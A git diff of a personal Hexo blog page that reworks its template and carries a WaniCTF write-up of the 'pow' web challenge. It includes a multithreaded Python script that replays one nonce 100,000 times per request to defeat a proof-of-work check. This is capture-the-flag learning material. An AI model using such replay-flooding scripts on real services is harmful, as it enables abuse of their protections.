@@ -1,76 +1,214 @@
 <!DOCTYPE html>
-<html>
-    <head>
-        <link href="https://cdn.jsdelivr.net/npm/jetbrains-mono@1.0.6/css/jetbrains-mono.min.css" rel="stylesheet">
-<title>aan0303</title>
-<meta charset="UTF-8">
-<meta name="description" content="whoami">
-<meta name="keywords" content="aan0303, megat, ilikeronnnnii">
-<meta name="author" content="Megat Zafran">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
-<meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
-<meta name="description" content="webpowcredits to my sifu @vicevirus  difficulty - easypoints - 143solves - 243  analysisfirst of all when you visit the website there is a client-side scripting consist of 3 function, hash, send and m">
-<meta property="og:type" content="article">
-<meta property="og:title" content="WaniCTF Writeups">
-<meta property="og:url" content="http://example.com/2024/06/24/wanictf/index.html">
-<meta property="og:site_name" content="aan0303">
-<meta property="og:description" content="webpowcredits to my sifu @vicevirus  difficulty - easypoints - 143solves - 243  analysisfirst of all when you visit the website there is a client-side scripting consist of 3 function, hash, send and m">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/image123.png">
-<meta property="og:image" content="http://example.com/images/image1234.png">
-<meta property="article:published_time" content="2024-06-24T02:00:23.000Z">
-<meta property="article:modified_time" content="2024-06-23T12:21:12.014Z">
-<meta property="article:author" content="Megat Zafran">
-<meta property="article:tag" content="writeups">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/image123.png">
-<link rel="shortcut icon" href="/images/avatar.png">
+<html lang="en">
 
-<link rel="stylesheet" href="/css/common.css">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Megat Zafran">
+
+
+    <meta name="subtitle" content="that one socially inept kid">
+
+
+    <meta name="description" content="whoami">
+
+
+    <meta name="keywords" content="aan0303, megat, ilikeronnnnii">
+
+
+<title>WaniCTF Writeups | aan0303</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
 
 
 
 
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
 
 
-  
-<link rel="stylesheet" href="/css/post.css">
 
-  <link rel="stylesheet" href="/css/highlight-dark.css" media="screen and (prefers-color-scheme: dark)">
-  <link rel="stylesheet" href="/css/highlight-light.css" media="screen and (prefers-color-scheme: light)">
-  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.8.0/build/highlight.min.js"></script>
-  <script>hljs.highlightAll();</script>
-  <script type="text/javascript"
-    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-  </script>
-  <script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
-    });
-  </script>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
 
-    <meta name="generator" content="Hexo 7.2.0"></head>
-    <body>
-        <div class="post">
-    <header class="breadcrumb">
-        <a href="/" style="text-decoration: underline; font-style: italic;">Home</a>
-        <span> / </span>
-        <a style="text-decoration: underline; font-style: italic;" href="/2024/06/24/wanictf/">WaniCTF Writeups</a>
-    </header>
-    <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pow"><span class="toc-text">pow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#analysis"><span class="toc-text">analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash-function"><span class="toc-text">hash function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#main-function"><span class="toc-text">main function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#send-function"><span class="toc-text">send function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-text">flag</span></a></li></ol></li></ol> -->
-    <div class="post-body">
-        <h1 class="post-title">WaniCTF Writeups</h1>
-        <div class="post-meta">
-            2024-5-24
-            <span> · </span>
-            
-                <a href="/tags/writeups">#writeups</a>
-            
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aan&#39;s stash</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-        <div class="post-content"><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="pow"><a href="#pow" class="headerlink" title="pow"></a>pow</h2><p>credits to my sifu <strong>@vicevirus</strong></p>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aan&#39;s stash</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">WaniCTF Writeups</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Megat Zafran</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 23, 2024&nbsp;&nbsp;19:00:23</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="pow"><a href="#pow" class="headerlink" title="pow"></a>pow</h2><p>credits to my sifu <strong>@vicevirus</strong></p>
 <blockquote>
 <p>difficulty - easy<br>points - 143<br>solves - 243</p>
 </blockquote>
@@ -105,9 +243,76 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url = &quot;https://web-pow-lz56g6.wanictf.org/api/pow&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: &quot;pow_session=&#123;your cookie&#125;&quot;, # insert your cookie</span><br><span class="line">    &quot;Content-Length&quot;: &quot;14&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload_list = [&quot;29671041&quot;] * 100000 # increases progress by 100000 times per post request</span><br><span class="line">payload = str(payload_list).replace(&quot;&#x27;&quot;, &#x27;&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">def send_request():</span><br><span class="line">    response = requests.post(url, headers=headers, data=payload)</span><br><span class="line">    if response.status_code == 429:  # Rate limit status code</span><br><span class="line">        retry_after = int(response.headers.get(&quot;Retry-After&quot;, 1))</span><br><span class="line">        print(f&quot;Rate limited. Retrying after &#123;retry_after&#125; seconds.&quot;)</span><br><span class="line">        time.sleep(retry_after)</span><br><span class="line">    else:</span><br><span class="line">        print(response.text)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    for _ in range(100):</span><br><span class="line">        threads = []</span><br><span class="line">        # Create 18 threads</span><br><span class="line">        for _ in range(18):</span><br><span class="line">            thread = threading.Thread(target=send_request)</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            thread.start()</span><br><span class="line">        </span><br><span class="line">        for thread in threads:</span><br><span class="line">            thread.join()</span><br><span class="line">        </span><br><span class="line">        time.sleep(10)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
 <h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><code>FLAG&#123;N0nCE_reusE_i$_FUn&#125;</code></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Megat Zafran</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://ilikeronnnnii.github.io/2024/06/24/wanictf/">https://ilikeronnnnii.github.io/2024/06/24/wanictf/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>peepo pog</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/writeups/"># writeups</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/08/10/ihack2024/">Siber Siaga I-Hack 2024</a>
+            
+            
+            <a class="next" rel="next" href="/2024/06/15/introToAndroid/">CSLU2 - Introduction to Android</a>
+            
+        </section>
+
+
+    </article>
 </div>
-        <div class="divider"></div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Megat Zafran | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
-</div>
-    </body>
+</footer>
+
+    </div>
+</body>
+
 </html>
